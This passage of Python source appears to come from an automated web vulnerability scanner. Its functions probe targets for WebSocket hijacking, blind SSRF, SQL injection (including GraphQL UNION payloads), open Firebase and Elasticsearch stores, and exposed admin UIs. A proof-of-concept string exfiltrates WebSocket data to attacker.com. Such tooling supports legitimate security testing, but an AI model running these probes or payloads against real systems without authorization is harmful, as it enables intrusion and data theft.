        for ws_url in list(ws_urls)[:5]:
            # Unencrypted check
            if ws_url.startswith("ws://"):
                findings.append(F("misconfig","medium",
                    ws_url.replace("ws://","http://"),
                    f"Unencrypted WebSocket: {ws_url[:60]}",
                    ws_url=ws_url,
                    poc=f"wscat -c '{ws_url}'",
                    impact="WebSocket traffic in plaintext -- MITM interception",
                    remediation="Use wss:// instead of ws://",
                    confidence=95))

            # CSWSH test
            try:
                http_url = ws_url.replace("wss://","https://").replace("ws://","http://")
                parsed   = urllib.parse.urlparse(http_url)
                host     = parsed.hostname or ""
                port     = parsed.port or (443 if parsed.scheme=="https" else 80)
                path     = parsed.path or "/"

                sock = socket.create_connection((host, port), timeout=8)
                if parsed.scheme in ("wss","https"):
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                import base64 as _b64, os as _os
                ws_key = _b64.b64encode(_os.urandom(16)).decode()
                req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                       f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
                       f"Sec-WebSocket-Key: {ws_key}\r\n"
                       f"Sec-WebSocket-Version: 13\r\n"
                       f"Origin: https://evil.bugscan.io\r\n\r\n")
                sock.sendall(req.encode())
                sock.settimeout(5)
                resp = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk: break
                        resp += chunk
                        if b"\r\n\r\n" in resp: break
                except: pass
                sock.close()

                if b"101 Switching Protocols" in resp:
                    findings.append(F("websocket","high",http_url,
                        "CSWSH -- WebSocket accepts arbitrary Origin header",
                        ws_url=ws_url,
                        evil_origin="https://evil.bugscan.io",
                        poc=(f"var ws=new WebSocket('{ws_url}');\n"
                             f"ws.onmessage=e=>fetch('//attacker.com/?d='+e.data);"),
                        impact="Steal cross-origin WebSocket messages, tokens, PII",
                        remediation="Validate Origin header against allowlist on upgrade.",
                        confidence=88))
            except Exception as e:
                log.debug(f"[cswsh] {ws_url}: {e}")

    return findings


# ── BLIND SSRF VIA PDF/IMAGE/WEBHOOK ──────────────────────────────────────────
def check_ssrf_oob_injection(endpoints: List[str], oob_host: str = "") -> List[dict]:
    """Blind SSRF via PDF generators, image processors, link preview, webhooks."""
    findings = []
    if not oob_host:
        oob_host = os.environ.get("BXSS_HOST","") or "oast.pro"

    oob_url = f"http://{oob_host}/ssrf-{int(time.time())%10000}"

    SSRF_PARAMS = ["url","src","href","link","target","dest","destination",
                   "html","content","template","uri","webhook","callback",
                   "notify","ping","hook","import","export","fetch","load",
                   "download","preview","thumbnail","screenshot","render",
                   "convert","report","generate","print","pdf"]

    PDF_PATHS = ["/api/pdf","/generate/pdf","/export/pdf","/render/pdf",
                 "/print","/export","/download/pdf","/api/export","/api/render",
                 "/api/screenshot","/api/thumbnail","/api/preview","/convert",
                 "/html2pdf","/pdf/generate"]

    tested = set()
    for ep in endpoints[:500]:
        try:
            parsed = urllib.parse.urlparse(ep)
            qs     = urllib.parse.parse_qs(parsed.query)
        except: continue

        for param in SSRF_PARAMS:
            if param not in qs: continue
            key = (ep.split("?")[0], param)
            if key in tested: continue
            tested.add(key)
            test = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode({**{k:v[0] for k,v in qs.items()}, param: oob_url})))
            r = _get(test, timeout=10)
            if r and r[0] in (200,201,202):
                findings.append(F("ssrf","high",ep,
                    f"Potential blind SSRF via '{param}'",
                    param=param, oob_url=oob_url,
                    poc=f"curl '{test}'  # check {oob_host} for callback",
                    impact="Server fetches attacker URL -- SSRF via PDF/image/webhook",
                    remediation="Validate URLs. Block internal IPs in fetchers.",
                    confidence=55))

    # Test PDF/export paths via POST
    bases = list(set(
        urllib.parse.urlunparse(urllib.parse.urlparse(ep)._replace(path="",query="",fragment=""))
        for ep in endpoints[:200] if urllib.parse.urlparse(ep).scheme))

    for base in bases[:20]:
        for path in PDF_PATHS:
            ep = base.rstrip("/") + path
            for param in ["url","html","src","content"]:
                r = _req(ep,"POST",
                         headers={"Content-Type":"application/json"},
                         data=f'{{"{param}":"{oob_url}"}}'.encode(),
                         timeout=10)
                if r and r[0] in (200,201,202):
                    if any(s in r[2].lower() for s in ["pdf","render","convert","success","job"]):
                        findings.append(F("ssrf","high",ep,
                            f"PDF/render endpoint SSRF via '{param}'",
                            param=param, oob_url=oob_url,
                            poc="curl -X POST " + repr(ep) + " -H Content-Type:application/json  # check oob_host for callback",
                            impact="PDF generator fetches attacker URL -- SSRF, port scan",
                            remediation="Sandbox PDF generators. Allowlist fetch URLs.",
                            confidence=65))
                    break
    return findings


def check_second_order_sqli(endpoints: List[str]) -> List[dict]:
    """Stored SQLi -- inject via POST form, trigger on display page."""
    findings = []
    CANARY   = f"sq1i'--bs{int(time.time())%10000}"
    ERR_SIGS = ["sql syntax","mysql_fetch","ORA-","SQLSTATE","syntax error",
                "unclosed quotation","sqlite_exception","pg_query","PDOException",
                "Microsoft OLE DB","JDBC","java.sql"]

    WRITE_PATS = ["register","signup","profile","update","edit","comment",
                  "review","submit","post","create","add","contact","feedback"]

    for ep in endpoints[:200]:
        if not any(p in ep.lower() for p in WRITE_PATS): continue
        params = _discover_post_params(ep)
        for action, param, _ in params:
            if param.lower() in ("csrf_token","_token","submit","button"): continue
            r = _post_inject(action, param, CANARY)
            if not r or r[0] not in (200,201,202,302): continue

            # Check display pages for triggered error
            display_eps = [e for e in endpoints[:200]
                           if any(p in e.lower() for p in
                                  ["profile","user","view","show","list","dashboard"])]
            for disp in display_eps[:10]:
                r2 = _get(disp, timeout=8)
                if r2 and CANARY in r2[2] and any(s.lower() in r2[2].lower() for s in ERR_SIGS):
                    findings.append(F("sqli","critical",action,
                        f"Second-order SQLi via '{param}' (triggers at {disp})",
                        param=param, payload=CANARY, trigger_url=disp,
                        poc=(f"# Step 1: Store\ncurl -X POST '{action}' -d '{param}={CANARY}'\n"
                             f"# Step 2: View stored data\ncurl '{disp}'  # SQL error appears"),
                        impact="Stored SQL injection -- executes when admin/user views data",
                        remediation="Use parameterized queries at both INSERT and SELECT.",
                        confidence=85))
                    break
    return findings




# ── HTTP/2 RAPID RESET ATTACK (CVE-2023-44487) ───────────────────────────────
def check_http2_rapid_reset(targets: List[str]) -> List[dict]:
    """
    CVE-2023-44487: HTTP/2 Rapid Reset Attack.
    Send HEADERS frame immediately followed by RST_STREAM.
    Vulnerable servers process request before seeing RST_STREAM.
    Allows amplified DoS with minimal client resources.
    """
    findings = []

    for url in targets[:20]:
        parsed = urllib.parse.urlparse(url)
        host   = parsed.hostname or ""
        port   = parsed.port or (443 if parsed.scheme=="https" else 80)

        try:
            # Test if server supports HTTP/2
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            # Set ALPN to request HTTP/2
            ctx.set_alpn_protocols(["h2","http/1.1"])

            sock = socket.create_connection((host, port), timeout=8)
            tls_sock = ctx.wrap_socket(sock, server_hostname=host)

            # Check negotiated protocol
            negotiated = tls_sock.selected_alpn_protocol()
            tls_sock.close()

            if negotiated == "h2":
                # HTTP/2 is supported - note CVE-2023-44487 risk
                # Full exploit requires h2 framing lib, so we detect and report
                findings.append(F("http2","medium",url,
                    f"HTTP/2 enabled -- CVE-2023-44487 Rapid Reset risk if unpatched",
                    alpn_negotiated=negotiated,
                    host=host, port=port,
                     poc="curl -v --http2 " + url + "  # CVE-2023-44487 PoC: github.com/Vignesh2712/CVE-2023-44487",
                    impact="HTTP/2 Rapid Reset -- amplified DoS via RST_STREAM abuse (up to 1M RPS with 100 connections)",
                    remediation="Update nginx/apache/h2load. Disable HTTP/2 if unpatched. Rate limit RST_STREAM.",
                    confidence=60,
                    pattern_only=True))  # Detection only, not exploitation

        except ssl.SSLError:
            pass  # No TLS / HTTP/2 not supported
        except Exception as e:
            log.debug(f"[h2-rapid-reset] {url}: {e}")

    return findings


# ── SOAP / ASMX / WSDL EXPOSURE ───────────────────────────────────────────────
def check_soap_asmx(targets: List[str], endpoints: List[str]) -> List[dict]:
    """
    Detect exposed SOAP/ASMX/WSDL web services.
    - Unauthenticated method enumeration via ?WSDL
    - Method disclosure via SOAP introspection
    - Verbose .NET stack trace on malformed input
    - Stack trace reveals internal class/namespace info
    - Write methods exposed without auth
    """
    findings = []
    ASMX_PATHS = [
        "/ShiftIt.asmx","/Service.asmx","/WebService.asmx",
        "/api.asmx","/service1.asmx","/ws.asmx","/soap.asmx",
        "/services/service.asmx","/app/service.asmx",
    ]
    WSDL_SUFFIXES = ["?WSDL","?wsdl","?WSDL=1","/wsdl","?disco",".wsdl"]
    WRITE_METHODS = ["update","save","delete","create","set","modify","change","send",
                     "post","write","insert","remove","reset","upload","import"]
    STACK_TRIGGERS = ["abc","'","<invalid>","badval","%27",";","null","undefined"]

    for base_url in targets[:30]:
        base = base_url.rstrip("/")
        # Discover ASMX files from endpoints + common paths
        asmx_urls = set()
        for ep in endpoints[:2000]:
            if ".asmx" in ep.lower():
                clean = ep.split("?")[0]
                asmx_urls.add(clean)
        for path in ASMX_PATHS:
            asmx_urls.add(base + path)

        for asmx_url in list(asmx_urls)[:20]:
            # Test 1: Can we get the WSDL (method enumeration)?
            methods = []
            write_methods = []
            for suffix in WSDL_SUFFIXES:
                r = _get(asmx_url + suffix, timeout=8)
                if not r or r[0] != 200: continue

                body = r[2]
                if not any(s in body for s in
                    ["<wsdl:","<definitions","wsdl:definitions","soap:","SOAP-ENV",
                     "portType","operation name=","<service name="]):
                    continue

                # Extract method names
                import re as _re
                methods = _re.findall(r'<operation name="([^"]+)"', body)
                write_methods = [m for m in methods
                                 if any(w in m.lower() for w in WRITE_METHODS)]

                sev = "high" if write_methods else "medium"
                findings.append(F("expose", sev, asmx_url + suffix,
                    f"SOAP/ASMX service exposed: {len(methods)} methods discoverable via WSDL",
                    methods_count=len(methods),
                    write_methods=write_methods[:10],
                    all_methods=methods[:30],
                    poc=f"curl '{asmx_url + suffix}' | grep 'operation name'",
                    impact=(f"API surface fully enumerated: {len(methods)} methods "
                            f"{'including WRITE operations: '+str(write_methods[:5]) if write_methods else 'discovered'}. "
                            f"Enables targeted brute-force and method abuse."),
                    remediation=(
                        "Require authentication before serving WSDL. "
                        "Add IP allowlisting or WAF rules. "
                        "Use <customErrors mode='RemoteOnly' /> in web.config."
                    ),
                    confidence=95))
                break

            # Test 2: Verbose stack trace via malformed input
            for param_trigger in STACK_TRIGGERS[:3]:
                test_url = asmx_url + f"?id={param_trigger}&U={param_trigger}"
                r = _get(test_url, timeout=6)
                if not r: continue
                body = r[2]
                if any(s in body for s in
                    ["System.","at System.","Stack trace","StackTrace",
                     "---> System.","Exception:","at ",
                     "System.Web.Services","System.ArgumentException",
                     "System.FormatException","System.InvalidOperationException"]):
                    findings.append(F("expose", "medium", test_url,
                        f"Verbose .NET stack trace disclosure on {asmx_url}",
                        trigger=param_trigger,
                        preview=body[:400],
                        poc=f"curl '{test_url}'",
                        impact="Internal class names, namespace hierarchy, framework version, and method call chains exposed to unauthenticated attackers.",
                        remediation="Set <customErrors mode='RemoteOnly' /> in web.config. Implement global exception handler returning generic errors.",
                        confidence=90))
                    break

            # Test 3: Unauthenticated method invocation via HTTP GET
            if methods:
                for method in methods[:10]:
                    test = f"{asmx_url}/{method}?GlobalEmployee=1"
                    r = _get(test, timeout=6)
                    if not r or r[0] != 200: continue
                    body = r[2]
                    # If we get JSON/XML response = method runs without auth
                    if any(s in body for s in ['"Success"','"success"',"<Success>",
                                                '"data"','"result"']):
                        auth_rejected = '"Success":false' in body or '"Success": false' in body
                        if not auth_rejected:
                            sev = "critical"
                        else:
                            sev = "medium"
                        findings.append(F("expose", sev, test,
                            f"ASMX method '{method}' responds without authentication",
                            method=method,
                            auth_rejected=auth_rejected,
                            preview=body[:300],
                            poc=f"curl '{test}'",
                            impact=("Unauthenticated API access -- method executes and returns data" 
                                    if not auth_rejected else
                                    "API surface exposed -- method processes request, revealing schema and parameter structure"),
                            remediation="Reject unauthenticated requests at transport layer before application code executes.",
                            confidence=85 if not auth_rejected else 70))

    # Check REST API schema leakage (JSON with empty but structured responses)
    for ep in endpoints[:500]:
        if "?" not in ep: continue
        r = _get(ep, timeout=6)
        if not r or r[0] != 200: continue
        body = r[2]
        # Detect rich schema in failed/empty API response
        if ('"Success":false' in body or '"success":false' in body) and len(body) > 200:
            import re as _re2
            fields = _re2.findall(r'"(\w{2,20})"\s*:\s*(?:null|0|false|\[\]|"")', body)
            sensitive = [f for f in fields if f.upper() in
                        ["DOB","SSN","EN","FEID","DOH","PID","PN","TL","FEN",
                         "SALARY","WAGE","PHONE","EMAIL","ADDRESS","PASSWORD"]]
            if len(fields) > 10 and sensitive:
                findings.append(F("expose","medium",ep,
                    f"API schema leaked in failed response: {len(fields)} fields including sensitive: {sensitive[:5]}",
                    field_count=len(fields),
                    sensitive_fields=sensitive,
                    preview=body[:400],
                    poc=f"curl '{ep}'",
                    impact="Complete internal data model exposed to unauthenticated attackers. Enables targeted parameter manipulation.",
                    remediation="Return generic error payload on auth failure. Never serialize schema structure for unauthenticated requests.",
                    confidence=80))
            break  # one per domain

    return findings



# ═══════════════════════════════════════════════════════════════════
# ELITE PRO -- ADVANCED ATTACK CHECKS
# ═══════════════════════════════════════════════════════════════════

# ── FIREBASE MISCONFIGURATION ─────────────────────────────────────
def check_firebase(targets: List[str], domain: str) -> List[dict]:
    """Detect unauthenticated Firebase DB + exposed API keys."""
    findings = []
    import re as _re

    # Extract Firebase project names from page source
    for url in targets[:20]:
        r = _get(url, timeout=8)
        if not r: continue
        body = r[2]
        
        # Find Firebase project IDs
        fb_ids = set(_re.findall(r"([a-z0-9-]+)\.firebaseio\.com", body))
        fb_ids.update(_re.findall(r"projectId[^:=]*[:=][^a-z0-9-]*([a-z0-9-]+)", body))
        
        for fb_id in list(fb_ids)[:5]:
            # Test open database
            test_url = f"https://{fb_id}.firebaseio.com/.json?shallow=true"
            r2 = _get(test_url, timeout=8)
            if r2 and r2[0] == 200 and r2[2] not in ('null',''):
                findings.append(F("expose","critical",test_url,
                    f"Firebase database publicly readable: {fb_id}",
                    firebase_id=fb_id,
                    preview=r2[2][:300],
                    poc=f"curl '{test_url}'",
                    impact="Read all Firebase database data without authentication",
                    remediation="Set Firebase rules: {\".read\":\"auth != null\",\".write\":\"auth != null\"}",
                    confidence=98))
            
            # Test write access
            test_write = f"https://{fb_id}.firebaseio.com/bugscan_test.json"
            r3 = _req(test_write,"PUT",
                     headers={"Content-Type":"application/json"},
                     data=b'"bugscan_probe"',timeout=6)
            if r3 and r3[0] == 200:
                # Clean up
                _req(test_write,"DELETE",timeout=5)
                findings.append(F("expose","critical",test_write,
                    f"Firebase database publicly WRITABLE: {fb_id}",
                    firebase_id=fb_id,
                poc="curl -X PUT " + test_write + " -d data",
                    impact="Write arbitrary data to Firebase database -- data destruction, inject malicious content",
                    remediation="Immediately restrict Firebase rules. Enable App Check.",
                    confidence=99))
        
        # Find Firebase API keys in source
        api_keys = _re.findall(r"AIza[0-9A-Za-z\-_]{35}", body)
        for key in set(api_keys)[:3]:
            # Test if API key can enumerate users
            test = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={key}"
            r4 = _req(test,"POST",
                     headers={"Content-Type":"application/json"},
                     data=b'{"email":"test@test.com","password":"wrongpassword123"}',
                     timeout=8)
            if r4 and r4[0] in (200,400):
                body4 = r4[2].lower()
                if "invalid password" in body4 or "email not found" in body4 or "error" in body4:
                    # Key is valid and auth endpoint reachable
                    enum_possible = "email not found" in body4
                    findings.append(F("expose","high" if enum_possible else "medium",url,
                        f"Firebase API key exposed" + (" + user enumeration possible" if enum_possible else ""),
                        api_key=key[:20]+"...",
                        user_enum=enum_possible,
                         poc="curl -X POST https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=" + key,
                        impact="Firebase API key enables account enumeration, auth bypass attempts, and FCM notification abuse",
                        remediation="Restrict Firebase API key in Google Console. Enable App Check. Never expose API keys in client-side code.",
                        confidence=85))
    return findings


# ── ELASTICSEARCH / OPENSEARCH EXPOSURE ──────────────────────────
def check_elasticsearch(targets: List[str]) -> List[dict]:
    """Detect unauthenticated Elasticsearch/OpenSearch clusters."""
    findings = []
    
    ES_PATHS = [
        ("/_cat/indices?v", ["health","status","index","pri","rep","docs.count"]),
        ("/_cluster/health", ["cluster_name","status","number_of_nodes"]),
        ("/_nodes/stats", ["transport_address","indices","os","process"]),
        ("/_cat/nodes?v", ["heap.percent","ram.percent","cpu","load"]),
        ("/_all/_search?size=1", ["hits","_index","_source","total"]),
        ("/_xpack/security/user", ["username","roles","enabled"]),  # user enumeration
    ]
    
    for base in targets[:30]:
        for path, sigs in ES_PATHS:
            r = _get(base.rstrip("/")+path, timeout=6)
            if not r or r[0] != 200: continue
            if any(s in r[2] for s in sigs):
                # Check for sensitive data
                has_user_data = any(s in r[2] for s in ["email","password","token","secret","credit","ssn","dob"])
                sev = "critical" if has_user_data else "high"
                findings.append(F("expose", sev, base+path,
                    f"Unauthenticated Elasticsearch: {path}",
                    endpoint=path, preview=r[2][:400],
                    has_sensitive_data=has_user_data,
                    poc=f"curl '{base+path}'",
                    impact="Full Elasticsearch cluster access -- read all indices, documents, and potentially PII",
                    remediation="Enable Elasticsearch security (xpack.security.enabled: true). Bind to localhost or add IP allowlist.",
                    confidence=96))
                break
    return findings


# ── MONGODB / REDIS / MEMCACHED EXPOSURE ─────────────────────────
def check_exposed_databases(targets: List[str]) -> List[dict]:
    """Check for exposed database management UIs."""
    findings = []
    
    DB_PATHS = [
        # MongoDB
        ("/mongo-express", ["Mongo Express","mongodb","Collection"]),
        ("/admin/mongo",   ["Mongo Express","mongodb"]),
        ("/mongoclient",   ["MongoDB","collection","database"]),
        # Redis Commander / RedisInsight
        ("/redis-commander", ["Redis Commander","KEYS","TTL"]),
        ("/redis",           ["Redis","KEYS","TTL","SET","GET"]),
        ("/redisinsight",    ["RedisInsight","redis","keys"]),
        # PHPMyAdmin / Adminer
        ("/phpmyadmin/",  ["phpMyAdmin","MySQL","database"]),
        ("/pma/",         ["phpMyAdmin","MySQL"]),
        ("/adminer",      ["adminer","Adminer","database"]),
        ("/dbadmin",      ["database","table","query"]),
        # pgAdmin
        ("/pgadmin",      ["pgAdmin","PostgreSQL","database"]),
        ("/pgadmin4",     ["pgAdmin","PostgreSQL"]),
        # Apache CouchDB
        ("/_utils/",      ["CouchDB","Futon","Fauxton"]),
        # InfluxDB
        ("/influxdb",     ["InfluxDB","measurement","bucket"]),
        # Cassandra
        ("/cassandra-web",["Cassandra","keyspace","table"]),
    ]
    
    for base in targets[:30]:
        for path, sigs in DB_PATHS:
            r = _get(base.rstrip("/")+path, timeout=5)
            if not r or r[0] not in (200,301,302): continue
            body = r[2] if r[0]==200 else ""
            if r[0] in (301,302):
                loc = r[1].get("Location","")
                r2 = _get(loc if loc.startswith("http") else base.rstrip("/")+loc, timeout=5)
                body = r2[2] if r2 and r2[0]==200 else ""
            if any(s in body for s in sigs):
                findings.append(F("expose","critical", base+path,
                    f"Exposed database admin UI: {path}",
                    endpoint=path, preview=body[:300],
                    poc=f"curl '{base+path}'",
                    impact="Full database admin access -- read/write/delete all data, potentially execute OS commands",
                    remediation="Restrict admin UI to internal network. Add authentication. Use VPN for remote access.",
                    confidence=95))
    return findings


# ── PARAMETER MINING (auto-discover hidden parameters) ────────────
def check_parameter_mining(endpoints: List[str], targets: List[str]) -> List[dict]:
    """
    Discover hidden GET/POST parameters not visible in source.
    Strategy: fuzz with wordlist, compare response differences.
    This finds injection points that crawlers miss.
    """
    findings = []
    
    # High-value parameter wordlist
    PARAM_WORDLIST = [
        # Debug / admin
        "debug","test","dev","admin","internal","private","hidden","secret",
        "trace","verbose","log","dump","config","settings","panel","console",
        # Auth bypass
        "token","key","api_key","apikey","auth","authorization","access","secret",
        "password","pass","pwd","hash","sig","signature","hmac",
        # Injection points
        "id","user_id","uid","account","account_id","profile","user","username",
        "email","name","query","q","search","s","keyword","term","filter","where",
        "order","sort","limit","offset","page","p","lang","locale","format","type",
        # Path/file
        "file","filename","path","dir","folder","url","src","href","redirect",
        "return","next","back","goto","forward","dest","to","from","include",
        # Data
        "data","content","body","payload","input","value","param","arg","args",
        "callback","jsonp","ref","referrer","source","origin","host","domain",
        # Feature flags
        "beta","preview","feature","flag","mode","version","v","api_version",
        "format","output","template","layout","theme","style","view","render",
    ]
    
    tested = set()
    
    for base in targets[:10]:
        # Try parameter discovery on base URL and common API paths
        test_paths = [base, base+"/api", base+"/api/v1", base+"/search"]
        
        for test_base in test_paths:
            # Get baseline response
            baseline = _get(test_base, timeout=6)
            if not baseline or baseline[0] >= 400: continue
            
            base_len = len(baseline[2])
            base_status = baseline[0]
            
            # Test params in batches
            found_params = []
            for i in range(0, min(len(PARAM_WORDLIST), 100), 10):
                batch = PARAM_WORDLIST[i:i+10]
                # Build URL with all batch params
                test_url = test_base + "?" + "&".join(f"{p}=FUZZ{j}" for j,p in enumerate(batch))
                r = _get(test_url, timeout=6)
                if not r: continue
                
                # If response differs significantly, find which param
                if abs(len(r[2]) - base_len) > 50 or r[0] != base_status:
                    for param in batch:
                        pkey = (test_base, param)
                        if pkey in tested: continue
                        tested.add(pkey)
                        
                        test_single = test_base + f"?{param}=BUGSCAN_PROBE_12345"
                        rs = _get(test_single, timeout=5)
                        if not rs: continue
                        
                        # Significant change = param is reflected/processed
                        if (abs(len(rs[2]) - base_len) > 30 and
                            "BUGSCAN_PROBE_12345" not in rs[2] and  # not just echo
                            rs[0] != base_status):
                            found_params.append(param)
            
            if found_params:
                findings.append(F("expose","low",test_base,
                    f"Hidden parameters discovered: {found_params[:10]}",
                    params=found_params[:20],
                    total_found=len(found_params),
                    poc=f"curl '{test_base}?{found_params[0]}=test'  # discovered via parameter mining",
                    impact="Hidden parameters may accept dangerous input -- test each for injection",
                    remediation="Review hidden parameters for injection vulnerabilities and unintended functionality.",
                    confidence=60))
    
    return findings


# ── OAUTH TOKEN LEAKAGE ───────────────────────────────────────────
def check_oauth_token_leak(endpoints: List[str], targets: List[str]) -> List[dict]:
    """
    OAuth tokens leaked via:
    1. Referrer header (token in URL sent to third-party)
    2. Browser history (access_token in URL fragment)
    3. Log files containing tokens
    4. Error messages revealing token values
    """
    findings = []
    import re as _re
    
    TOKEN_PATTERNS = [
        (r"access_token=([A-Za-z0-9\-_.~+/]{20,})", "OAuth access_token in URL"),
        (r"#access_token=([A-Za-z0-9\-_.~+/]{20,})", "OAuth implicit flow token in fragment"),
        (r"token=([A-Za-z0-9\-_.~+/]{30,})", "Token in URL parameter"),
        (r'access_token["]: *"([^"]{20,})', "Access token in JSON response"),
        (r"Authorization:\s*Bearer\s+([A-Za-z0-9\-_.~+/]{20,})", "Bearer token in log/error"),
        (r"client_secret[^=:]*[:=][^A-Za-z0-9]*([A-Za-z0-9_-]{10,})", "OAuth client_secret exposed"),
    ]
    
    for ep in endpoints[:500]:
        r = _get(ep, timeout=6)
        if not r or r[0] != 200: continue
        body = r[2]
        
        for pattern, desc in TOKEN_PATTERNS:
            matches = _re.findall(pattern, body)
            if matches:
                token_preview = matches[0][:20] + "..."
                findings.append(F("jsleak","high",ep,
                    f"{desc}: {token_preview}",
                    token_preview=token_preview,
                    token_count=len(matches),
                    poc=f"curl '{ep}' | grep -o '{pattern[:30]}'",
                    impact="Exposed OAuth token enables account takeover -- attacker can authenticate as victim",
                    remediation="Never put tokens in URLs. Use POST body or headers. Rotate all exposed tokens immediately.",
                    confidence=85))
                break
        
        # Check for tokens leaking via Referrer
        if "?" in ep and any(p in ep.lower() for p in ["token","access","auth","key"]):
            parsed = urllib.parse.urlparse(ep)
            qs = urllib.parse.parse_qs(parsed.query)
            for param, vals in qs.items():
                if any(s in param.lower() for s in ["token","access_token","api_key","secret"]):
                    if vals and len(vals[0]) > 15:
                        findings.append(F("jsleak","high",ep,
                            f"Sensitive token in URL: '{param}' -- leaks via Referrer header",
                            param=param, preview=vals[0][:20]+"...",
                            poc=f"curl -I '{ep}'  # Referer header will contain token",
                            impact="Token sent to all third-party resources loaded by page via Referer header",
                            remediation="Move tokens from URLs to POST body or Authorization header. Use PKCE for OAuth.",
                            confidence=80))
    
    return findings


# ── ACCOUNT TAKEOVER VIA RESPONSE MANIPULATION ────────────────────
def check_account_takeover(endpoints: List[str]) -> List[dict]:
    """
    Detect ATO patterns:
    1. Password reset with predictable tokens
    2. Email change without re-authentication
    3. Auth bypass via response code manipulation
    4. Password reset poisoning (host header)
    5. Broken object level auth on /me endpoint
    """
    findings = []
    import re as _re
    
    # Check /me, /profile, /account endpoints for IDOR
    me_endpoints = [e for e in endpoints[:500]
                    if any(p in e.lower() for p in ["/me","/profile","/account",
                                                     "/user/me","/api/me","/self",
                                                     "/current_user","/whoami"])]
    
    for ep in me_endpoints[:20]:
        r = _get(ep, timeout=6)
        if not r or r[0] != 200: continue
        body = r[2]
        
        # Check for sensitive data in /me response
        sensitive_fields = []
        for field in ["email","password","token","secret","ssn","dob","phone",
                      "credit_card","card_number","cvv","bank_account","salary"]:
            if field in body.lower():
                sensitive_fields.append(field)
        
        if sensitive_fields:
            findings.append(F("idor","high",ep,
                f"/me endpoint exposes sensitive fields: {sensitive_fields[:5]}",
                sensitive_fields=sensitive_fields,
                preview=body[:300],
                poc=f"curl '{ep}'  # Returns sensitive fields without auth check",
                impact="Sensitive profile data exposed -- may enable account takeover or PII breach",
                remediation="Require authentication on all /me endpoints. Never return password hashes or payment data.",
                confidence=75))
    
    # Check password reset for predictable tokens
    reset_endpoints = [e for e in endpoints[:500]
                       if any(p in e.lower() for p in ["/reset","/forgot","/password",
                                                        "/recover","/forgot-password",
                                                        "/reset-password"])]
    
    for ep in reset_endpoints[:10]:
        r = _get(ep, timeout=6)
        if not r: continue
        body = r[2]
        
        # Check for insecure reset patterns
        if _re.search(r'type="hidden".*?name=".*?token.*?".*?value="([0-9]{4,8})"', body, _re.I):
            findings.append(F("reset_poison","high",ep,
                "Password reset uses short numeric token -- brutable",
                poc=f"curl '{ep}' | grep token  # Extract token value",
                impact="Password reset token brute-forceable -- account takeover possible",
                remediation="Use cryptographically random 32+ byte tokens. Expire after 15 minutes. Rate limit.",
                confidence=80))
        
        # Check for token in URL (leaks via Referer)
        if "token=" in ep or "reset_token=" in ep or "code=" in ep:
            findings.append(F("reset_poison","medium",ep,
                "Password reset token transmitted in URL -- leaks via Referer",
                poc=f"# Token in URL leaks to analytics/CDN via Referer header",
                impact="Reset token exposed to third parties via browser Referer header",
                remediation="Use POST body for reset tokens, never URL parameters.",
                confidence=85))
    
    return findings


# ── GRAPHQL DEEP INJECTION ───────────────────────────────────────
def check_graphql_injection(endpoints: List[str]) -> List[dict]:
    """
    GraphQL-specific injection attacks:
    1. SQLi through GraphQL arguments
    2. NoSQLi through GraphQL
    3. SSRF through GraphQL queries
    4. Batch query DoS
    5. Field suggestion enumeration
    """
    findings = []
    
    GQL_ENDPOINTS = [e for e in endpoints[:500]
                     if any(p in e.lower() for p in ["/graphql","/api/graphql",
                                                      "/gql","/query","/graphiql"])]
    
    SQL_GQL_PAYLOADS = [
        '{"query":"{users(id:\"1 OR 1=1--\"){id email password}}"}',
        '{"query":"{user(name:\"admin\' OR \'1\'=\'1\'){token password}}"}',
        '{"query":"{search(q:\"test\' UNION SELECT username,password FROM users--\"){results}}"}',
    ]
    
    SQL_ERR_SIGS = ["syntax error","mysql","postgresql","sqlite","ORA-","SQLSTATE",
                    "column","table","database error","unterminated quoted"]
    
    for ep in GQL_ENDPOINTS[:20]:
        # Test SQLi through arguments
        for payload in SQL_GQL_PAYLOADS[:2]:
            r = _req(ep,"POST",
                    headers={"Content-Type":"application/json"},
                    data=payload.encode(),timeout=8)
            if not r: continue
            if any(s.lower() in r[2].lower() for s in SQL_ERR_SIGS):
                findings.append(F("sqli","critical",ep,
                    f"SQL injection via GraphQL query argument",
                    payload=payload[:100],
                    preview=r[2][:300],
                    poc=f"curl -X POST '{ep}' -H 'Content-Type:application/json' -d '{payload}'",
                    impact="SQL injection via GraphQL -- database extraction through API layer",
                    remediation="Parameterize all database queries in GraphQL resolvers. Never interpolate user input.",
                    confidence=88))
                break
        
        # Test field suggestions (information disclosure)
        typo_query = '{"query":"{usr{id}}"}'  # intentional typo
        r2 = _req(ep,"POST",
                 headers={"Content-Type":"application/json"},
                 data=typo_query.encode(),timeout=6)
        if r2 and "Did you mean" in r2[2]:
            import re as _re2
            suggestions = _re2.findall(r'"Did you mean[^"]*"([^"]+)"', r2[2])
            findings.append(F("graphql","low",ep,
                f"GraphQL field suggestions enabled -- schema enumerable via typos: {suggestions[:5]}",
                suggestions=suggestions[:10],
                poc=f"curl -X POST '{ep}' -H 'Content-Type:application/json' -d '{typo_query}'",
                impact="Schema enumeration without introspection -- leak field names via error suggestions",
                remediation="Disable field suggestions in production GraphQL.",
                confidence=90))
    
    return findings



# ── API VERSION ENUMERATION ───────────────────────────────────────────────────
def check_api_versioning(targets: List[str], endpoints: List[str]) -> List[dict]:
    """Detect old API versions still accessible after newer versions deployed."""
    findings = []
    import re as _re2

    versions_found = set()
    for ep in endpoints[:2000]:
        m = _re2.search(r"/api/v([0-9]+)", ep, _re2.I)
        if m: versions_found.add(int(m.group(1)))

    if not versions_found or max(versions_found) <= 1:
        return findings

    max_ver = max(versions_found)
    for base_url in targets[:20]:
        base = base_url.rstrip("/")
        for old_ver in range(1, max_ver):
            for path in [f"/api/v{old_ver}/users", f"/api/v{old_ver}/", f"/v{old_ver}/"]:
                r = _get(base + path, timeout=5)
                if r and r[0] in (200, 403):
                    findings.append(F("expose", "medium" if r[0]==403 else "high",
                        base + path,
                        f"Old API v{old_ver} accessible (current: v{max_ver})",
